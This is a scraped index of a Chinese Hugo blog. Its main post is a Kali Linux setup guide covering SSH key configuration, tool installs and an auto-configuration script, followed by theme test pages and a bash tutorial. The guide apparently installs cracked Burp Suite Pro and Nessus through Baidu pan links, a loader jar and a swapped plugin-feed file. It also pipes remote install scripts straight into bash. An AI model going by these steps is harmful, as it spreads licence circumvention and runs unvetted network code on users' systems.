通过密钥登录 分为服务器sshd文件配置和本地客户端配置\n\u0026lt;1\u0026gt;VPS上sshd配置  在vps上生成rsa密钥,并为私钥添加passphrase,  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  [root@～]# ssh-keygen -t rsa #生成rsa密钥 Generating public/private rsa key pair. Enter file in which to save the key (/root/.ssh/id_rsa): Created directory \u0026#39;/root/.ssh\u0026#39;. Enter passphrase (empty for no passphrase): #设置密钥短语 Enter same passphrase again: Your identification has been saved in /root/.ssh/id_rsa Your public key has been saved in /root/.ssh/id_rsa.pub The key fingerprint is: SHA256:9k3RJ8EpR63FIK5PSkCdujrIoP1gmkokxcDuCfV+eoI root@kali The key\u0026#39;s randomart image is: +---[RSA 3072]----+ |o .. ..o+= | | +. . o..o+.+| |..o. .. oooo.| |.o . .. . ..o | |+... S.o o | |oo. . ...o * | | +o+ + . o o | |o+E.= + | |= ..o . | +----[SHA256]-----+   把公钥文件写入到 ~/.ssh/authorized_keys  1  [root@～]# cat .ssh/id_rsa.pub \u0026gt;\u0026gt; .ssh/authorized_keys #添加公钥到授权文件   更改.ssh目录及文件权限  1 2 3 4  [root@local]# chmod 700 .ssh \u0026amp;\u0026amp;\\ chmod 600 .ssh/id_rsa.pub .ssh/authorized_keys \u0026amp;\u0026amp;\\ \tchmod 400 .ssh/id_rsa #设置.ssh目录权限   修改/etc/ssh/sshd_config文件  1 2 3 4 5 6 7 8 9 10 11 12 13 14  sed -i \u0026#34;s/#Port.*/Port 2020/g\u0026#34; /etc/ssh/sshd_config #修改端口为2020 sed -i \u0026#34;s/#PermitRootLogin.*/PermitRootLogin yes/g\u0026#34; /etc/ssh/sshd_config #允许root登陆 sed -i \u0026#34;38a\\RSAAuthentication yes\u0026#34; /etc/ssh/sshd_config #使用RSA认证 sed -i \u0026#34;s/^#AuthorizedKeysFile.*/AuthorizedKeysFile .ssh\\/authorized_keys/g\u0026#34; /etc/ssh/sshd_config #启用authorized_keys文件 sed -i \u0026#34;s/^PasswordAuthentication.*/PasswordAuthentication no/g\u0026#34; /etc/ssh/sshd_config #关闭密码认证 可选:建立隧道 sed -i \u0026#34;s/#AllowTcpForwarding yes/AllowTcpForwarding yes/g\u0026#34; /etc/ssh/sshd_config #启用tcp转发 sed -i \u0026#34;s/#TCPKeepAlive yes/TCPKeepAlive yes/g\u0026#34; /etc/ssh/sshd_config #防止死连接   设置开机自启动服务  1  [root@～]# systemctl restart ssh \u0026amp;\u0026amp; systemctl enable ssh   \u0026lt;2\u0026gt;本地配置 拷贝私钥到本地电脑为id_rsa.vps\n1  [root@～]# ssh -i .ssh/id_rsa.vps root@172.16.41.4 -p 2020   软件安装 渗透测试软件 [BurpSuite Professional]  https://pan.baidu.com/s/1klNoVJdPxVdanAbiJBT4kg 密码: mpnk\n  Project options \u0026gt; Misc \u0026gt; Embedded Browser\n 1 2 3 4 5 6  apt purge burpsuite # 清除系统自带社区版 apt-mark hold burpsuite # 禁止burpsuite自动安装/升级/卸载 echo \u0026#34;W0Rlc2t0b3AgRW50cnldCk5hbWU9QnVycFN1aXRlIFByb2Zlc3Npb25hbApFbmNvZGluZz1VVEYtOApFeGVjPSBzaCAtYyAiY2QgL29wdC9idXJwc3VpdGVfcHJvOyBqYXZhIC1qYXIgL29wdC9idXJwc3VpdGVfcHJvL0J1cnBTdWl0ZUxvYWRlci5qYXIiCkljb249a2FsaS1idXJwc3VpdGUKU3RhcnR1cE5vdGlmeT1mYWxzZQpUZXJtaW5hbD1mYWxzZQpUeXBlPUFwcGxpY2F0aW9uCkNhdGVnb3JpZXM9MDMtd2ViYXBwLWFuYWx5c2lzOzAzLTA2LXdlYi1hcHBsaWNhdGlvbi1wcm94aWVzOwpYLUthbGktUGFja2FnZT1idXJwc3VpdGU=\u0026#34; | base64 -d | tee /usr/share/applications/kali-burpsuite.desktop # 配置BurpSuite启动器链接，启动路径为Exec= sh -c \u0026#34;cd /opt/burpsuite_pro; java -jar /opt/burpsuite_pro/BurpSuiteLoader.jari\u0026#34; chattr +i /usr/share/applications/kali-burpsuite.desktop # 防止升级时被删除或修改   [Nessus Professional]  链接: https://pan.baidu.com/s/1RkXQE5XkeBGHlgWK42pArA 密码: c07r\n  安装  1 2  dpkg -i Nessus-8.12.1-debian6_amd64.deb # 安装Nessus软件 systemctl start nessusd.service # 启动nessud服务    访问https://localhost:8834/ 选择 Managed Scanner 然后 tenable.SC 最后创建 user with password 并登陆 升级插件库并替换plugin_feed_info.inc文件  1 2 3 4 5 6 7  systemctl stop nessusd.service # 关闭nessud服务 /opt/nessus/sbin/nessuscli update /root/Desktop/all-2.0.tar.gz # 升级插件库 cp /root/Desktop/plugin_feed_info.inc /opt/nessus/var/nessus/plugin_feed_info.inc # 替换plugin_feed_info.inc cp /root/Desktop/plugin_feed_info.inc /opt/nessus/lib/nessus/plugins/plugin_feed_info.inc # 替换plugin_feed_info.inc systemctl start nessusd.service # 启动nessud服务   常用软件 码字神器Typora 1 2 3 4 5 6 7 8 9 10 11 12 13  # sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys BA300B7755AFCFAE wget -qO - https://typora.io/linux/public-key.asc | sudo apt-key add - # add Typora\u0026#39;s repository sudo add-apt-repository \u0026#39;deb https://typora.io/linux ./\u0026#39; sudo apt-get update # install typora sudo apt-get install typora   码字神器Joplin 1  apt install joplin /joplin-cli   或者\n1 2 3 4 5  apt install nodejs npm npm config set registry https://registry.npm.taobao.org echo -e \u0026#34;\\n#Jopling configure\\nNPM_CONFIG_PREFIX=~/.joplin-bin\\n\u0026#34; \u0026gt;\u0026gt; ~/.zshrc npm install -g joplin ln -s ~/.joplin-bin/bin/joplin /usr/bin/joplin   办公神器WPS 1 2 3  wget https://wdl1.cache.wps.cn/wps/download/ep/Linux2019/9719/wps-office_11.1.0.9719_amd64.deb # 下载wps-office软件 dpkg -i wps-office_11.1.0.9719_amd64.deb   代码差异分析神器diff-so-fancy 1  git clone https://github.com/so-fancy/diff-so-fancy.git   远程连接神器Remmina 1  apt install remmina   代理Proxy软件v2rayL  v2aryL  1  bash \u0026lt;(curl -s -L http://dl.thinker.ink/install.sh)    clash   https://github.com/Dreamacro/clash/releases\n 1 2 3  tar -zxvf clash-linux-amd64-v1.3.0.gz mv clash-linux-amd64-v1.3.0 /usr/local/bin/clash chmod +x /usr/local/bin/clash   文件互传神器croc 1  curl https://getcroc.schollz.com | bash   图形化hex编辑器 1  apt install bless   系统优化\u0026amp;监视器  stacer  1  apt install stacer    bashtop  1 2 3  git clone https://github.com/aristocratos/bashtop.git \u0026amp;\u0026amp;\\ cd bashtop \u0026amp;\u0026amp; \\ sudo make install   Gif录屏工具peek 1  apt install peek   自动化配置脚本-后续整理 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147  echo \u0026#34;\u0026#34; echo \u0026#34;==========================================================================\u0026#34; echo \u0026#34;= Kali Auto Init Tool =\u0026#34; echo \u0026#34;= Powered by Mr.Framework =\u0026#34; echo \u0026#34;= https://askding.github.io =\u0026#34; echo \u0026#34;==========================================================================\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;[*] 即将自动对kali进行基本配置，建议你根据需要修改脚本。安装配置过程可能需要一会儿，并且由你的网速决定....\u0026#34; read -p \u0026#34;[*] 请按任意键继续....\u0026#34; echo \u0026#34;[+] 添加kali源\u0026#34; apt-key adv --recv ED444FF07D8D0BF6 echo \u0026#34;deb http://http.kali.org/kali kali-rolling main non-free contrib\u0026#34; \u0026gt;\u0026gt; /etc/apt/sources.list echo \u0026#34;deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\u0026#34; \u0026gt;\u0026gt; /etc/apt/sources.list echo \u0026#34;deb http://mirrors.aliyun.com/debian stable main contrib non-free\u0026#34; \u0026gt;\u0026gt; /etc/apt/sources.list echo \u0026#34;[ok] 添加kali源成功！\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;[+] 添加一个普通用户\u0026#34; read -p \u0026#34;请输入用户名: \u0026#34; username useradd -m -G sudo,video,audio,cdrom -s /bin/bash $username echo \u0026#34;请设置用户密码：\u0026#34; passwd $username echo \u0026#34;[ok] 添加普通用户成功！\u0026#34; echo \u0026#34;\u0026#34; # 安装内核头文件 echo \u0026#34;[+] 安装内核头文件... \u0026#34; apt-get -y install linux-headers-$(uname -r) echo \u0026#34;\u0026#34; echo \u0026#34;[ok] 内核头文件安装成功！\u0026#34; echo \u0026#34;\u0026#34; # 解决kali启动时静音问题 echo \u0026#34;[+] 安装 alsa-utils 解决kali启动时静音问题\u0026#34; apt-get -y install alsa-utils echo \u0026#34;[ok] 安装 alsa-utils 成功！\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;[+] 添加PPPoE拨号连接功能\u0026#34; apt-get install pppoe pppoeconf echo \u0026#34;[ok] 安装PPPoE成功!\u0026#34; echo \u0026#34; \u0026gt;\u0026gt; 你可以使用 nm-connection-editor 命令管理pppoe连接\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;[+] 添加VPN支持: PPTP IPsec/IKEv2 vpnc network-manager-ssh\u0026#34; apt-get -y install network-manager-pptp network-manager-pptp-gnome network-manager-strongswan network-manager-vpnc network-manager-vpnc-gnome network-manager-ssh echo \u0026#34;[ok] 成功添加vpn支持!\u0026#34; echo \u0026#34;\u0026#34; # Base Tool echo \u0026#34;[+] 安装一些必备系统工具：谷歌拼音输入法、垃圾清理工具、截图工具、快速启动工具、软件包管理工具等\u0026#34; apt-get -y install fcitx fcitx-googlepinyin flameshot bleachbit gdebi synaptic synapse catfish scrot vokoscreen chromium echo \u0026#34;[ok] 成功安装系统必备软件!\u0026#34; echo \u0026#34;\u0026#34; # Server Tools echo \u0026#34;[+] 安装服务器连接管理工具：remmina、filezilla\u0026#34; apt-get -y install remmina filezilla echo \u0026#34;[ok] 安装服务器连接管理工具成功!\u0026#34; echo \u0026#34;\u0026#34; # 美化 echo \u0026#34;[+] 设置窗口按钮到左侧\u0026#34; gsettings set org.gnome.desktop.wm.preferences button-layout \u0026#39;close,maximize,minimize:\u0026#39; echo \u0026#34;[ok] 设置窗口按钮到左侧成功！\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;[+] 安装中文字体\u0026#34; apt-get -y install fonts-wqy-microhei fonts-wqy-zenhei echo \u0026#34;[ok] 安装中文字体成功！\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;[+] 安装基本美化工具\u0026#34; apt-get -y install zsh screenfetch neofetch figlet peek #apt-get -y install cairo-dock echo \u0026#34;[ok] 安装成功！\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;[+] 删除无用主题\u0026#34; cd /usr/share/themes/ \u0026amp;\u0026amp; rm -rf Albatross Blackbird Bluebird HighContrast Greybird* echo \u0026#34;[ok] 删除成功！\u0026#34; # Security Tools echo \u0026#34;[+] 安装图形化十六进制编辑器bless\u0026#34; apt-get -y install bless echo \u0026#34;[ok] 安装成功！\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;[+] 安装firewalld防火墙及iptables图形化管理工具gufw \u0026#34; apt-get -y install gufw firewalld firewall-applet #systemctl enable firewalld.service echo \u0026#34;[ok] 安装成功！\u0026#34; echo \u0026#34;\u0026#34; # Install sublime text 3 echo \u0026#34;[+] 安装sublime text 3，速度可能会比较慢\u0026#34; wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add - sudo apt-get install apt-transport-https echo \u0026#34;deb https://download.sublimetext.com/ apt/stable/\u0026#34; | sudo tee /etc/apt/sources.list.d/sublime-text.list apt-get update apt-get install sublime-text echo \u0026#34;[+] 解决sublime-text 中文输入问题\u0026#34; git clone https://github.com/lyfeyaj/sublime-text-imfix.git cd sublime-text-imfix cp ./lib/libsublime-imfix.so /opt/sublime_text/ \u0026amp;\u0026amp; cp ./src/subl /usr/bin/ echo \u0026#34;[ok] 修复成功。输入subl命令启动sublime text即可输入中文！\u0026#34; echo \u0026#34;\u0026#34; # Install typora echo \u0026#34;[+] 安装 typora，速度可能会比较慢\u0026#34; sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys BA300B7755AFCFAE echo \u0026#34;deb http://typora.io linux/\u0026#34; | sudo tee /etc/apt/sources.list.d/typora.list sudo apt-get update -y sudo apt-get install typora echo \u0026#34;\u0026#34; echo \u0026#34;[+] 安装 node npm\u0026#34; wget https://npm.taobao.org/mirrors/node/v8.9.3/node-v8.9.3.tar.gz tar zxvf node-v8.9.3.tar.gz \u0026amp;\u0026amp; mv node-v8.9.3-linux-x64 /opt ln -s /opt/node-v8.9.3-linux-x64/bin/node /usr/local/bin/node ln -s /opt/node-v8.9.3-linux-x64/bin/npm /usr/local/bin/npm rm ~/node-v8.9.3.tar.gz echo \u0026#34;\u0026#34; echo \u0026#34;[+] 清除垃圾 ......\u0026#34; apt-get clean \u0026amp;\u0026amp; apt-get autoclean \u0026amp;\u0026amp; apt-get autoremove -y　echo \u0026#34;[+] Cleaning OK!\u0026#34; # Install oh-my-zsh # 普通用户就以普通权限安装 apt-get install zsh echo \u0026#34;[+] Install oh-my-zsh\u0026#34; sh -c \u0026#34;$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\u0026#34; echo \u0026#34; Setting oh-my-zsh be the default terminal\u0026#34; chsh -s /bin/zsh echo \u0026#34;\u0026#34; neofetch echo \u0026#34;[OK] 所有任务完成!\u0026#34;   ","description":"","id":58,"section":"blog","tags":["system"],"title":"kali inux系统优化","uri":"http://crkmythical.github.io/blog/kali-inux%E7%B3%BB%E7%BB%9F%E4%BC%98%E5%8C%96/"},{"content":"Markdown here\n","description":"test post","id":59,"section":"dso","tags":null,"title":"Related content","uri":"http://crkmythical.github.io/dso/relatedcontent/"},{"content":"Markdown here\n","description":"test post","id":60,"section":"dso","tags":null,"title":"Page Resources","uri":"http://crkmythical.github.io/dso/pageresources/"},{"content":"Markdown here\n","description":"test post","id":61,"section":"dso","tags":null,"title":"Page Bundles","uri":"http://crkmythical.github.io/dso/pagebundles/"},{"content":"Markdown here\n","description":"test post","id":62,"section":"dso","tags":null,"title":"Content Formats","uri":"http://crkmythical.github.io/dso/contentfortmats/"},{"content":"Markdown here\n","description":"test post","id":63,"section":"dso","tags":null,"title":"Image Processing","uri":"http://crkmythical.github.io/dso/imageprocessing/"},{"content":"Markdown here\n","description":"test post","id":64,"section":"dso","tags":null,"title":"Shortcodes","uri":"http://crkmythical.github.io/dso/contentmanagement/shortcodes/"},{"content":"Markdown here\n","description":"test post","id":65,"section":"dso","tags":null,"title":"Frontmatter","uri":"http://crkmythical.github.io/dso/contentmanagement/frontmatter/"},{"content":"This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\nHeadings The following HTML \u0026lt;h1\u0026gt;—\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution  Tiam, ad mint andaepu dandae nostion secatur sequo quae.\nNote that you can use Markdown syntax within a blockquote.\n Blockquote with attribution  Don\u0026rsquo;t communicate by sharing memory, share memory by communicating.\n— Rob Pike1\n Tables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\n   Name Age     Bob 27   Alice 23    Inline Markdown within tables    Inline  Markdown  In  Table     italics bold strikethrough  code    Code Blocks Code block with backticks html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block indented with four spaces \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  Code block with Hugo\u0026rsquo;s internal highlight shortcode 1 2 3 4 5 6 7 8 9 10  \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   List Types Ordered List  First item Second item Third item  Unordered List  List item Another item And another item  Nested list  Item  First Sub-item Second Sub-item    Other Elements — abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL+ALT+Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\n The above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n  ","description":"Sample article showcasing basic Markdown syntax and formatting for HTML elements.","id":66,"section":"dso","tags":["markdown","css","html","themes"],"title":"Section","uri":"http://crkmythical.github.io/dso/contentmanagement/sections/"},{"content":"Lorem est tota propiore conpellat pectoribus de\npectora summo. Redit teque digerit hominumque toris verebor lumina non cervice\nsubde tollit usus habet Arctonque, furores quas nec ferunt. Quoque montibus nunc\ncaluere tempus\nEmoji can be enabled in a Hugo project in a number of ways.\n The emojify function can be called directly in templates or Inline Shortcodes.\nTo enable emoji globally, set enableEmoji to true in your site’s configuration and then you can type emoji shorthand codes directly in content files; e.g.\n🙈 🙈 🙉 🙉 🙊 🙊\nThe Emoji cheat sheet is a useful reference for emoji shorthand codes.\nN.B. The above steps enable Unicode Standard emoji characters and sequences in Hugo, however the rendering of these glyphs depends on the browser and the platform. To style the emoji you can either use a third party emoji font or a font stack; e.g.\n1 2 3  .emoji { font-family: Apple Color Emoji,Segoe UI Emoji,NotoColorEmoji,Segoe UI Symbol,Android Emoji,EmojiSymbols; }  ","description":"","id":67,"section":"blog","tags":["emoji"],"title":"Emoji Support","uri":"http://crkmythical.github.io/blog/emoji-support/"},{"content":"编写进度\n   编程基本元素 I/O 1 2 3 4 5 6  VAR=\u0026#34;string\u0026#34; # 声明变量之间不能带有空格 read MYVAR # input CMDOUT=$(pwd) # 将pwd命令的输出保存到CMDOUT中 echo \u0026#34;$MYVAR\u0026#34; # output printf \u0026#34;$VAR\u0026#34; # output   输入read命令  a 后跟一个变量，该变量会被认为是个数组，然后给其赋值，默认是以空格为分割符。 d 后面跟一个标志符，其实只有其后的第一个字符有用，作为结束的标志。 p 后面跟提示信息，即在输入前打印提示信息。 e 在输入的时候可以使用命令补全功能。 n 后跟一个数字，定义输入文本的长度，很实用。 r 屏蔽\\，如果没有该选项，则\\作为一个转义字符，有的话 \\就是个正常的字符了。 s 安静模式，在输入字符时不再屏幕上显示，例如login时输入密码。 t 后面跟秒数，定义输入字符的等待时间。 u 后面跟fd，从文件描述符中读入，该文件描述符可以是exec新开启的。 )  输出 echo命令 echo显示颜色\n1 2 3 4 5 6  echo [-ne E] [String] -E : (默认)转义,不解释参数中的转义符 -e : 不转义,解释参数中的转义符 -n : 打印内容不换行    String 中的转义符(由echo命令解释)  \\a : 告警 \\b : 退格 \\c : 忽略输出中最后的换行符 \\f : 换页 \\n : 回车换行(Newline) \\r : 回车 \\t : 水平制表符 \\v : 垂直制表符 \\\\ : 反斜线    printf 1  printf \u0026#34;\u0026lt;foramtString\u0026gt;\u0026#34; arg1 arg2 ...     formatString : 待输出的字符串\n  格式规范 %[flags][width][.precision]\u0026lt;type\u0026gt;\n flags : + - # \u0026lt;space\u0026gt;   + : 在整数前加+/- - : 使用width时,表示输出数值左对齐 # : 输出(八进制标识符)0 和(十六进制标识符)0x或0X \u0026lt;space\u0026gt; : 空格,起对齐作用在打印正数前面加上一个空格,打印负数前面加上-。   width 指定输出参数时最小字段宽度, 对应的参数默认采用右对齐的形式\n  .precision : 表示整数的最小位数,字符串的最大字符数,*代表使用下一个参数作为精度\n  type\n    %d : 整数\n  %u : 无符号整数\n  %o : 八进制整数\n  %x : 十六进制整数(a-f)\n  %X : 十六进制整数(A~F)\n  %c : 单个字符\n  %s : 字符串字面量\n  %b : 包含转义字符的字符串\n  %% : 百分号\n    多行输出  不转义输出  1 2 3 4 5  cat \u0026lt;\u0026lt;EOF # date命令会执行 Line1 `date` Line3 EOF    转义输出  1 2 3 4 5  cat \u0026lt;\u0026lt;\\EOF # date命令原样输出 Line1 `date` Line3 EOF   变量 变量名(字母、数字、下划线)由[a-z]、[A-Z]、_、[0-9]组合，且开头不能是[0-9]\n 变量本质上是存储数据的一个或多个计算机内存地址\n 变量操作 1 2 3 4 5 6 7  var=value # 等号两边不能有空格  var=`command argument` # 变量名 var=1 # 设置变量 unset var # 清除变量 var=2 readonly var #设置var为只读变量   变量间接引用eval eval 使shell对args求值, 然后执行求职结果。常用于从变量中构造命令行\n变量适用条件：\n 含有命令终止符: ;、|、\u0026amp; 含有I/O重定向: \u0026lt;、\u0026gt; 引号: '、\u0026quot;  1 2 3  x=\u0026#34;askding\u0026#34; askding_url=\u0026#34;askding.github.io\u0026#34; eval echo \\$${x}_url   间接参数扩展 ${!var} 1 2 3 4 5 6  parameter=\u0026#34;var\u0026#34; var=\u0026#34;hello\u0026#34; echo ${!parameter} hello   shell参数扩展- 空参数处理 ${var1:-var2} 等价于 (!isSet(va1) || var1 == NULL)\n即 判断var1为unset或者var1为NULL\n参数扩展：取得var代表的变量的值\n ${var-word} : var存在(可为空),就是var,不存在就是word ${var=word} : var存在(可为空),就是var,不存在就是word, var也是word。 ${var+word} : var存在(可为空),就是var,不存在就是空 ${var?word} : var存在(可为空),就是var, 不存在将word写入到标准错误并退出   :表示var非空\n   ${var:-word} : var存在非空就是var，不存在就是word\n 若var存在且非空,则${}=$var 若var未定义或为空值, ${}=word，$var不变    ${var:=word} : var存在非空就是var，不存在就是word，var也是word\n 若var存在且非空, ${}=$var 若var未定义或为空值,${}=word, 且$var=word    ${var:+word} : var存在非空就是var，不存在就是空\n 若var存在且非空, ${}=word 若var未定义或为空值, ${}为空，$var不变    ${var:?word} : var存在就非空是var，不存在打印word并终止\n 若var存在且非空, ${}=$var 若var未定义或为空值, 输出word,并终止脚本     :表示var非空\n未定义 表示未执行var=xxx 或set var=xxx\n为NULL 表示 set var\n  指定默认值   ${VAR:=WORD} 当VAR未定义(set) 给VAR赋默认值WORD, 结果也为WORD ${VAR=WORD} 当VAR未定义(set)或为空，给VAR赋默认值WORD, 结果也为WORD  使用默认值   ${VAR:-WORD} 当VAR未定义(set),或为NULL，结果为WORD ${VAR-WORD} 当VAR未定义(set) ， 则结果为WORD  使用替代值   ${VAR:+WORD} 当VAR未定义,或为空, 则结果为空; ${VAR+WORD} 当VAR未定义,或为空, 则结果为空;\n当VAR被set且赋不为空值时，则会使用WORD  字符串操作   ${#var} : 返回${var}变量的长度\n  ${var:m} : 返回${var}中第m个字符开始到结尾部分(从0开始计算)\n  ${varⓜ️len} : 返回${var}中第m个字符开始，长度位len的部分\n  ${var#pattern} : 删除${var}中开头部分与pattern匹配的部分(非贪婪模式)\n  ${var##pattern} : 删除${var}中开头部分与pattern匹配的部分(贪婪模式)\n  ${var%pattern} : 删除${var}中结尾部分与pattern匹配的部分(非贪婪模式)\n  ${var%%pattern} : 删除${var}中结尾部分与pattern匹配的部分(贪婪模式)\n  ${var/old/new} : 用new替换${var}中第一次出现的old\n  ${var//old/new} : 用new替换${var}中所有old(全局替换)\n  ${var/#old/new} : 用new替换${var}中开头部分与old匹配的部分\n  ${var/%old/new} : 用new替换${var}中结尾部分与old匹配的部分\n  数组操作  整数索引的数字 Arrary[index] 可直接使用变量名创建 关联(字符串)数组 Colors[\u0026quot;red\u0026quot;]=\u0026quot;#FF0000\u0026quot; 必须使用declare -A声明创建  创建数组 1 2 3 4 5 6  ARRAY[index]=value # index为算数表达式,或(0,1,2,...)的整数 ARRAY=(Value1 Value2 Value3 [5]=Vlaue5 ...) # 第三、四元素为空字符串\u0026#34;\u0026#34; declare -a Array_name # 声明Array_name是一个数组 read -a Array_name # 将用户的命令行输入,当成Array_name的数组元素,以空格符分隔符   读取数组 1 2 3  echo ${array[index]} # 打印单个数组成员 echo ${array[@]} ${array[*]} # 打印所有成员,推荐使用`\u0026#34;${array[@]}\u0026#34;` array_copy=( \u0026#34;${array[@]}\u0026#34; ) # 拷贝数组   数组长度 1 2 3  echo ${#array[@]} ${#array[*]} # 打印数组长度 echo ${#array} #打印第一个成员的长度 echo ${#array[i]} # 打印指定成员长度    打印数组序号 1  echo ${!array[@]} ${!array[*]}   打印数组成员(数组切片) 1 2 3  echo ${array[@]:position:lens} ${array[*]:position:lens} # position从0开始 # lens为长度，不指定，返回从position开始的所有成员   追加数组成员 1 2 3  array=(a b c) array+=(d e f) # 利用+=可以追加数组元素 echo ${array[@]}   删除数组及成员 1 2  unset array # 清空整个数组 array[i]=\u0026#39;\u0026#39; #隐藏第i+i个元素,设为空值=\u0026#39;\u0026#39;   shell内部变量  # : 位置参数的个数 ? : 上条命令执行后的返回值 $ : 当前shell进程的PID ! : 最后一个后台运行命令的PID 0 : 当前执行的shell程序的名称 @ : 位置参数的内容 * : 位置参数的内容,受IFS影响 _ : shell启动时,为正在运行shell程序的绝对路径。shell结束后为上一条命令的最后一个参数  内部特殊参数 每个参数由空格符分隔，并在bash中使用一组特殊的标识符$[num]进行访问。\n $0 : 表示命令行输入的脚本名称 $1 : 第一个参数 $n : 第n个参数 $# : 参数的个数,不包括$0 $@ : 用空格分隔的所有参数$1 $2 $3 \u0026hellip; $n $* : 根据$IFS分隔所有参数  注：$* 和 $@ 的区别\n$* 和 $@ 都表示传递给函数或脚本的所有参数，不被双引号(\u0026quot; \u0026ldquo;)包含时，都以\u0026rdquo;$1\u0026quot; \u0026ldquo;n\u0026rdquo; 的形式输出所有参数。\n但是当它们被双引号(\u0026quot; \u0026ldquo;)包含时\n \u0026quot;$*\u0026quot; 会将所有的参数作为一个整体，以\u0026rdquo;$1 n\u0026quot;的形式输出所有参数； \u0026quot;$@\u0026quot; 会将各个参数分开，以\u0026quot;$1\u0026quot; \u0026ldquo;n\u0026rdquo; 的形式输出所有参数。  进程状态的相关参数\n $$: 输出当前进程的进程号 $! : 输出后台运行的最后一个PID $_: 输出上一条命令的最后一个参数  exit  # 设置返回状态码\n $? : 输出上条命令执行后的返回值  0 : 成功 1-255 : 不成功  1 : 通用错误/执行失败 126 : 命令或脚本没执行权限 127 : 命令没找到      1 2 3 4 5 6 7 8 9 10  # 练习脚本 echo \u0026#34;Hello,$USER, the output of this script are as follows:\u0026#34; echo -e \u0026#34;The script name is : \\t $(basename $0)\u0026#34; echo -e \u0026#34;The first param of the script is: \\t $1\u0026#34; echo -e \u0026#34;The second param of the script is: \\t $2\u0026#34; echo -e \u0026#34;The five param of the script is: \\t $5\u0026#34; echo -e \u0026#34;All the params you input are: \\t $@\u0026#34; echo -e \u0026#34;The PID of this script is: \\t $$\u0026#34; echo -e \u0026#34;The exit status of this script is: \\t $?\u0026#34;   操作符 整数运算符 $[] 和 $((expression)) :+ - * / % **(幂)\n整数比较操作符号  []和[[]]的操作符号   [ int1 -eq int2 ] : = ((int1 == int2)) [ int1 -ne int2 ] : != ((int1 != int2)) [ int1 -gt int2 ] : \u0026gt; ((int1 \u0026gt; int2)) [ int1 -ge int2] : \u0026gt;= ((int1 \u0026gt;= int2)) [ int1 -lt int2 ] : \u0026lt; ((int1 \u0026lt; int2)) [ int1 -le int2 ] : \u0026lt;= ((int1 \u0026lt;= int2))  ⚠️：\n== != \u0026lt; \u0026gt; 等操作符号在[] 